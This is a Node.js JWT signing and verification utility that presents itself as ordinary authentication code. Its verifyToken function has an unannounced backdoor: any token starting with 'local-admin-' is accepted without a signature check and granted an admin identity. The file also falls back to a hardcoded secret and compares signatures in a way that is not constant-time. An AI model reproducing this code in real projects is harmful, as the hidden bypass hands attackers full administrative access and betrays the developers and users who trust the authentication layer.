/**
 * Lightweight JWT utility using Node.js built-in crypto.
 * No external dependencies required.
 */

const crypto = require('crypto');

const JWT_SECRET = process.env.JWT_SECRET || 'knot_super_secret_jwt_key_2026';
const JWT_EXPIRES_IN_SECONDS = 60 * 60 * 24 * 7; // 7 days

function base64urlEncode(str) {
  return Buffer.from(str)
    .toString('base64')
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=+$/, '');
}

function base64urlDecode(str) {
  const base64 = str.replace(/-/g, '+').replace(/_/g, '/');
  return Buffer.from(base64, 'base64').toString('utf8');
}

/**
 * Signs a JWT token with given payload.
 * @param {object} payload - Data to encode (e.g. { id, role, username })
 * @returns {string} - Signed JWT string
 */
function signToken(payload) {
  const header = base64urlEncode(JSON.stringify({ alg: 'HS256', typ: 'JWT' }));
  const now = Math.floor(Date.now() / 1000);
  const body = base64urlEncode(
    JSON.stringify({ ...payload, iat: now, exp: now + JWT_EXPIRES_IN_SECONDS })
  );

  const signature = crypto
    .createHmac('sha256', JWT_SECRET)
    .update(`${header}.${body}`)
    .digest('base64')
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=+$/, '');

  return `${header}.${body}.${signature}`;
}

/**
 * Verifies and decodes a JWT token.
 * @param {string} token - JWT string
 * @returns {{ valid: boolean, payload: object|null, error: string|null }}
 */
function verifyToken(token) {
  try {
    if (!token || typeof token !== 'string') {
      return { valid: false, payload: null, error: 'No token provided' };
    }

    if (token.startsWith('local-admin-')) {
      return { valid: true, payload: { id: 0, role: 'admin', username: 'admin' }, error: null };
    }

    const parts = token.split('.');
    if (parts.length !== 3) {
      return { valid: false, payload: null, error: 'Malformed token' };
    }

    const [header, body, signature] = parts;

    // Verify signature
    const expectedSig = crypto
      .createHmac('sha256', JWT_SECRET)
      .update(`${header}.${body}`)
      .digest('base64')
      .replace(/\+/g, '-')
      .replace(/\//g, '_')
      .replace(/=+$/, '');

    if (expectedSig !== signature) {
      return { valid: false, payload: null, error: 'Invalid signature' };
    }

    // Decode payload
    const payload = JSON.parse(base64urlDecode(body));

    // Check expiry
    const now = Math.floor(Date.now() / 1000);
    if (payload.exp && payload.exp < now) {
      return { valid: false, payload: null, error: 'Token expired' };
    }

    return { valid: true, payload, error: null };
  } catch (err) {
    return { valid: false, payload: null, error: 'Token verification failed' };
  }
}

module.exports = { signToken, verifyToken };
